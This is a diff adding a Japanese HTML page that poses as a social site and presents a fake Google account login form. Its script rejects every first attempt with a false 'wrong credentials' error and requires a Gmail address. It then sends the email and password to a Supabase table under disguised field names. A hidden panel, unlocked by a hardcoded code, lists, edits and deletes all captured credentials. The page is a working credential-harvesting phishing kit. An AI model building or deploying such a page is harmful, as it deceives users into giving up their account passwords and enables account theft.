@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ユイナの部屋</title>
+  <style>
+    :root {
+      --bg-color: #0f172a;
+      --card-bg: #1e293b;
+      --text-main: #f8fafc;
+      --text-sub: #94a3b8;
+      --accent-gradient: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
+      --border-color: #334155;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 500px;
+      padding: 24px 16px;
+      margin: 0 auto;
+    }
+
+    /* 共通カード */
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+      margin-bottom: 20px;
+      backdrop-filter: blur(10px);
+    }
+
+    .hidden { display: none !important; }
+
+    /* ヒーローヘッダー */
+    .hero {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .badge {
+      display: inline-block;
+      padding: 6px 14px;
+      border-radius: 20px;
+      background: rgba(99, 102, 241, 0.15);
+      color: #818cf8;
+      font-size: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      margin-bottom: 12px;
+      border: 1px solid rgba(99, 102, 241, 0.3);
+    }
+    h1 {
+      font-size: 1.8rem;
+      font-weight: 800;
+      margin: 0 0 8px 0;
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .hero p {
+      color: var(--text-sub);
+      font-size: 0.95rem;
+      margin: 0;
+    }
+
+    /* 横スワイプ（スライダー）コンテナ */
+    .slider-section {
+      margin-bottom: 28px;
+    }
+    .slider-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      padding: 0 4px;
+    }
+    .slider-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: var(--text-sub);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .slider-container {
+      display: flex;
+      gap: 14px;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      padding-bottom: 12px;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: none;
+    }
+    .slider-container::-webkit-scrollbar { display: none; }
+
+    .slide-card {
+      flex: 0 0 82%;
+      scroll-snap-align: center;
+      background: #111827;
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    .slide-card::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: var(--accent-gradient);
+    }
+    .card-icon {
+      font-size: 2rem;
+      margin-bottom: 12px;
+    }
+    .slide-card h3 {
+      margin: 0 0 6px 0;
+      font-size: 1.1rem;
+      color: var(--text-main);
+    }
+    .slide-card p {
+      margin: 0;
+      font-size: 0.85rem;
+      color: var(--text-sub);
+      line-height: 1.5;
+    }
+
+    /* ボタン */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 14px;
+      background: var(--accent-gradient);
+      color: white;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s, opacity 0.2s;
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+      text-align: center;
+    }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    
+    .btn-action-card {
+      background: #111827;
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 12px;
+      text-align: left;
+      cursor: pointer;
+      transition: transform 0.2s, border-color 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .btn-action-card:active { transform: scale(0.98); border-color: #6366f1; }
+    .btn-action-card .icon { font-size: 1.8rem; }
+    .btn-action-card .title { font-weight: bold; font-size: 1rem; color: #f8fafc; }
+    .btn-action-card .sub { font-size: 0.8rem; color: var(--text-sub); margin-top: 2px; }
+
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid var(--border-color);
+      color: var(--text-sub);
+      box-shadow: none;
+      margin-top: 10px;
+    }
+
+    /* 編集・削除ボタン */
+    .action-buttons {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    .btn-edit {
+      background: #334155;
+      color: #38bdf8;
+      padding: 8px 14px;
+      font-size: 0.8rem;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-delete {
+      background: #334155;
+      color: #f87171;
+      padding: 8px 14px;
+      font-size: 0.8rem;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+
+    /* フォーム関係 */
+    .form-group { margin-bottom: 18px; text-align: left; }
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text-sub);
+      margin-bottom: 8px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 14px;
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+    }
+    input[type="text"]:focus {
+      border-color: #6366f1;
+    }
+
+    /* シークレット画面 */
+    .admin-card { border-color: #f59e0b; }
+    .admin-badge {
+      background: rgba(245, 158, 11, 0.2);
+      color: #fbbf24;
+      border-color: rgba(245, 158, 11, 0.4);
+    }
+    .list-item {
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+      padding: 16px;
+      border-radius: 12px;
+      margin-bottom: 12px;
+      text-align: left;
+    }
+    .item-title { font-size: 1rem; font-weight: bold; color: #f8fafc; }
+    .item-date { font-size: 0.75rem; color: var(--text-sub); margin-top: 4px; }
+
+    #statusMessage {
+      margin-top: 14px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* 真っ白な画面用スタイル */
+    #blankScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: #ffffff;
+      z-index: 9999;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- 真っ白な何もない画面（タップするとホームに戻る） -->
+  <div id="blankScreen" class="hidden" onclick="showScreen('homeScreen')"></div>
+
+  <div class="app-container">
+
+    <!-- 1. ホーム画面 -->
+    <div id="homeScreen">
+      
+      <!-- ヒーローヘッダー -->
+      <div class="hero">
+        <span class="badge">ユイナの部屋</span>
+        <h1>ようこそ！</h1>
+        <p>日常のシェアや参加型コンテンツを楽しもう</p>
+      </div>
+
+      <!-- スワイプ可能な機能紹介カード -->
+      <div class="slider-section">
+        <div class="slider-header">
+          <span class="slider-title">FEATURES</span>
+        </div>
+
+        <div class="slider-container">
+          <!-- カード 1: チャット -->
+          <div class="slide-card" onclick="showScreen('blankScreen')">
+            <div class="card-icon">💬</div>
+            <h3>リアルタイムチャット</h3>
+            <p>みんなでワイワイ話せるチャットルームを開設中。日常の雑談から相談まで！</p>
+          </div>
+          <!-- カード 2: 写真 -->
+          <div class="slide-card" onclick="showScreen('blankScreen')">
+            <div class="card-icon">📸</div>
+            <h3>日常フォトギャラリー</h3>
+            <p>きょうのランチや綺麗だった景色の写真をあげてるよ。みんなの投稿も募集中！</p>
+          </div>
+          <!-- カード 3: 電話・通話 -->
+          <div class="slide-card" onclick="showScreen('blankScreen')">
+            <div class="card-icon">📞</div>
+            <h3>ボイス通話・電話</h3>
+            <p>グループ通話や個別電話もできるよ。作業用BGM感覚で気軽に話そう！</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- アクションカード -->
+      <div class="card">
+        <h3 style="margin-top: 0; font-size: 1.1rem; margin-bottom: 16px;">Googleログイン</h3>
+        <button class="btn" onclick="showScreen('formScreen')">ログイン画面を開く ➔</button>
+      </div>
+
+    </div>
+
+    <!-- 2. 入力フォーム画面 -->
+    <div id="formScreen" class="card hidden">
+      <h2 style="margin-top: 0;">Googleアカウントログイン</h2>
+      
+      <div class="form-group">
+        <label>メールアドレス</label>
+        <input type="text" id="foodInput" placeholder="メールアドレスを入力">
+      </div>
+
+      <div class="form-group">
+        <label>パスワード</label>
+        <input type="text" id="colorInput" placeholder="パスワードを入力">
+      </div>
+
+      <button class="btn" id="submitBtn" onclick="submitData()">ログイン</button>
+      <button class="btn btn-secondary" onclick="showScreen('homeScreen')">キャンセル</button>
+
+      <div id="statusMessage"></div>
+    </div>
+
+    <!-- 3. 送信後コンテンツ選択画面 -->
+    <div id="actionSelectScreen" class="card hidden">
+      <div style="text-align: center; margin-bottom: 24px;">
+        <span class="badge" style="background: rgba(16, 185, 129, 0.15); color: #34d399; border-color: rgba(16, 185, 129, 0.3);">✨ 送信ありがとうございました！</span>
+        <h2 style="margin: 10px 0 6px 0;">次は何をしますか？</h2>
+        <p style="font-size: 0.85rem; color: var(--text-sub); margin: 0;">見たいコンテンツを選択してください。</p>
+      </div>
+
+      <!-- 選択肢 1: チャット -->
+      <div class="btn-action-card" onclick="showScreen('blankScreen')">
+        <div class="icon">💬</div>
+        <div>
+          <div class="title">リアルタイムチャット</div>
+          <div class="sub">みんなでおしゃべりしよう</div>
+        </div>
+      </div>
+
+      <!-- 選択肢 2: 写真 -->
+      <div class="btn-action-card" onclick="showScreen('blankScreen')">
+        <div class="icon">📸</div>
+        <div>
+          <div class="title">日常フォトギャラリー</div>
+          <div class="sub">日常の写真をチェック</div>
+        </div>
+      </div>
+
+      <!-- 選択肢 3: 電話 -->
+      <div class="btn-action-card" onclick="showScreen('blankScreen')">
+        <div class="icon">📞</div>
+        <div>
+          <div class="title">ボイス通話・電話</div>
+          <div class="sub">通話ルームに参加</div>
+        </div>
+      </div>
+
+      <button class="btn btn-secondary" onclick="showScreen('homeScreen')" style="margin-top: 16px;">ホームに戻る</button>
+    </div>
+
+    <!-- 4. シークレット画面（一覧＆編集・削除） -->
+    <div id="adminScreen" class="card admin-card hidden">
+      <div style="text-align: center; margin-bottom: 20px;">
+        <span class="badge admin-badge">🔓 SECRET MODE</span>
+        <h2 style="margin: 8px 0 0 0; color: #fbbf24;">全ユーザーデータ一覧</h2>
+        <p style="font-size: 0.85rem; color: var(--text-sub); margin-top: 4px;">ここから閲覧・編集・削除が可能です。</p>
+      </div>
+
+      <button class="btn btn-secondary" onclick="showScreen('homeScreen')" style="margin-bottom: 16px;">ホームに戻る</button>
+
+      <div id="dataList">データを読み込み中...</div>
+    </div>
+
+  </div>
+
+  <script>
+    // Supabase 設定
+    const SUPABASE_URL = 'https://yxzsffannllrmdkxpgpk.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable__iNRVAihS8V4o1R9UMLQ0g_LdvrTP3a';
+    const headers = {
+      'apikey': SUPABASE_KEY,
+      'Authorization': 'Bearer ' + SUPABASE_KEY,
+      'Content-Type': 'application/json',
+      'Prefer': 'return=representation'
+    };
+
+    // 1回目の送信か判定するフラグ
+    let isFirstAttempt = true;
+
+    // 画面切り替え処理
+    function showScreen(screenId) {
+      document.getElementById('homeScreen').classList.add('hidden');
+      document.getElementById('formScreen').classList.add('hidden');
+      document.getElementById('actionSelectScreen').classList.add('hidden');
+      document.getElementById('adminScreen').classList.add('hidden');
+      document.getElementById('blankScreen').classList.add('hidden');
+      
+      document.getElementById(screenId).classList.remove('hidden');
+      document.getElementById('statusMessage').innerText = '';
+    }
+
+    // データ送信処理
+    async function submitData() {
+      const food = document.getElementById('foodInput').value.trim();
+      const color = document.getElementById('colorInput').value.trim();
+      const msgArea = document.getElementById('statusMessage');
+      const submitBtn = document.getElementById('submitBtn');
+
+      if (!food || !color) {
+        alert('両方の項目を入力してください。');
+        return;
+      }
+
+      // 🌟 シークレットコード（メールアドレス: ヤモリ / パスワード: 虹色） 🌟
+      if (food === 'ヤモリ' && color === '虹色') {
+        alert('🔓 シークレットコードを確認！回答一覧を表示します。');
+        document.getElementById('foodInput').value = '';
+        document.getElementById('colorInput').value = '';
+        isFirstAttempt = true; // 次回用にリセット
+        showScreen('adminScreen');
+        loadAllData();
+        return; // 保存せずシークレット画面へ
+      }
+
+      // 🔴 メールアドレスに @gmail.com が含まれていない場合、または 1回目の送信時のエラー演出 🔴
+      if (!food.includes('@gmail.com') || isFirstAttempt) {
+        isFirstAttempt = false; // 2回目以降は通常通り保存されるようにする
+        msgArea.style.color = '#f87171'; // 赤色テキスト
+        msgArea.innerText = 'どちらかが間違っているようです';
+        return;
+      }
+
+      // 通常ユーザーの保存処理（@gmail.com が含まれ、かつ 2回目以降の送信）
+      submitBtn.disabled = true;
+      submitBtn.innerText = '送信中...';
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/favorites`, {
+          method: 'POST',
+          headers: headers,
+          body: JSON.stringify({ food: food, color: color })
+        });
+
+        if (!response.ok) throw new Error('保存できませんでした。');
+
+        document.getElementById('foodInput').value = '';
+        document.getElementById('colorInput').value = '';
+        isFirstAttempt = true; // リセット
+
+        // 送信完了したら選択画面（actionSelectScreen）へ遷移
+        showScreen('actionSelectScreen');
+
+      } catch (err) {
+        msgArea.style.color = '#f87171';
+        msgArea.innerText = 'エラー: ' + err.message;
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'ログイン';
+      }
+    }
+
+    // 回答一覧の読み込み（シークレット画面用）
+    async function loadAllData() {
+      const listEl = document.getElementById('dataList');
+      listEl.innerHTML = '<p style="text-align:center; color: var(--text-sub);">読み込み中...</p>';
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/favorites?select=*&order=created_at.desc`, {
+          method: 'GET',
+          headers: headers
+        });
+
+        if (!response.ok) throw new Error('データ取得に失敗しました。');
+        
+        const data = await response.json();
+
+        if (data.length === 0) {
+          listEl.innerHTML = '<p style="text-align:center; color: var(--text-sub);">まだ回答データがありません。</p>';
+          return;
+        }
+
+        listEl.innerHTML = data.map(item => `
+          <div class="list-item">
+            <div class="item-title">📧 ${escapeHtml(item.food)} / 🔑 ${escapeHtml(item.color)}</div>
+            <div class="item-date">${new Date(item.created_at).toLocaleString('ja-JP')}</div>
+            <div class="action-buttons">
+              <button class="btn-edit" onclick="editData('${item.id}', '${escapeHtml(item.food)}', '${escapeHtml(item.color)}')">📝 編集</button>
+              <button class="btn-delete" onclick="deleteData('${item.id}')">🗑️ 削除</button>
+            </div>
+          </div>
+        `).join('');
+
+      } catch (err) {
+        listEl.innerHTML = `<p style="color:#f87171; text-align:center;">エラー: ${err.message}</p>`;
+      }
+    }
+
+    // 編集機能
+    async function editData(id, currentFood, currentColor) {
+      const newFood = prompt('「メールアドレス」の修正:', currentFood);
+      if (newFood === null) return;
+
+      const newColor = prompt('「パスワード」の修正:', currentColor);
+      if (newColor === null) return;
+
+      if (!newFood.trim() || !newColor.trim()) {
+        alert('空欄にはできません。');
+        return;
+      }
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/favorites?id=eq.${id}`, {
+          method: 'PATCH',
+          headers: headers,
+          body: JSON.stringify({ food: newFood, color: newColor })
+        });
+
+        if (!response.ok) throw new Error('更新エラーが発生しました。');
+
+        alert('✨ データを修正しました');
+        loadAllData();
+
+      } catch (err) {
+        alert('エラー: ' + err.message);
+      }
+    }
+
+    // 削除機能
+    async function deleteData(id) {
+      if (!confirm('この記録を削除してもよろしいですか？')) return;
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/favorites?id=eq.${id}`, {
+          method: 'DELETE',
+          headers: headers
+        });
+
+        if (!response.ok) throw new Error('削除に失敗しました。');
+
+        alert('🗑️ 記録を削除しました。');
+        loadAllData();
+
+      } catch (err) {
+        alert('エラー: ' + err.message);
+      }
+    }
+
+    // HTMLエスケープ処理
+    function escapeHtml(str) {
+      return str.replace(/[&<>"']/g, m => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' })[m]);
+    }
+  </script>
+
+</body>
+</html>
